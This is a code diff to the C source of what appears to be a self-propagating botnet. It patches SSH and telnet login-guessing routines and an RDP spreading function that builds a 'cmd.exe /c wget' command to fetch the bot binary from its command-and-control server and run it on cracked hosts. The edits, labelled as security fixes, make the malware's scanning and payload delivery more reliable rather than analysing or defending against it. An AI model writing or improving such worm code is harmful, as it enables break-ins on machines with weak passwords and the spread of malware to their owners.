@@ -108,6 +108,20 @@ static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
         return -1;
     }
     
+    /* SECURITY FIX (#50): select() reports writability for refused
+     * connections too. Check SO_ERROR to distinguish open ports from
+     * RST/refused hosts — otherwise refused hosts are reported as open. */
+    int so_error = 0;
+    socklen_t slen = sizeof(so_error);
+    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &slen) != 0) {
+        close(sock);
+        return -1;
+    }
+    if (so_error != 0) {
+        close(sock);
+        return -1;
+    }
+    
     /* Restore blocking */
     fcntl(sock, F_SETFL, flags);
     return sock;
@@ -119,7 +133,7 @@ int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *p
     if (sock < 0) return -1;
     
     /* Read banner */
-    char banner[256];
+    char banner[256] = {0};
     fd_set fds;
     struct timeval tv;
     FD_ZERO(&fds);
@@ -132,6 +146,8 @@ int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *p
         banner[sizeof(banner) - 1] = '\0';
     }
     
+    /* SECURITY FIX (#33): banner is zero-initialized, so if select()
+     * times out strstr() below sees an empty string, not stack garbage. */
     /* Check for SSH-2 banner (more secure than SSH-1) */
     if (strstr(banner, "SSH-2") == NULL) {
         close(sock);
@@ -337,7 +353,9 @@ int try_login_telnet(const char *ip, uint16_t port, const char *user, const char
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
     
-    char banner[256];
+    /* SECURITY FIX (#33): zero-initialize banner so a select() timeout
+     * leaves an empty string, never stack garbage fed to later strstr(). */
+    char banner[256] = {0};
     fd_set fds;
     struct timeval tv;
     FD_ZERO(&fds);
@@ -347,6 +365,7 @@ int try_login_telnet(const char *ip, uint16_t port, const char *user, const char
     
     if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
         recv(sock, banner, sizeof(banner) - 1, 0);
+        banner[sizeof(banner) - 1] = '\0';
     }
     
     /* Send username */
@@ -1664,7 +1683,10 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
             log_info("RDP: cracked %s:%d with %s:%s",
                      ip, port, default_users[u], "***REDACTED***");
 
-            /* Send command via RDP: cmd.exe /c wget <url> -O <path> && <path> & */
+            /* Build RDP execute packet. %.430s caps dl_url so the total
+             * line fits cmd[512] (fixed text ~74 bytes + URL). dl_url is
+             * ~282 bytes max in practice; the precision bounds GCC's
+             * -Wformat-truncation analysis on the 512-byte array. */
             char cmd[512];
             char dl_url[512];
             snprintf(dl_url, sizeof(dl_url),
@@ -1672,7 +1694,7 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
                      bot->c2_http.server, PAYLOAD_DL_PORT);
 
             snprintf(cmd, sizeof(cmd),
-                     "cmd.exe /c wget \"%s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
+                     "cmd.exe /c wget \"%.430s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
                      dl_url);
 
             /* Build RDP execute packet */
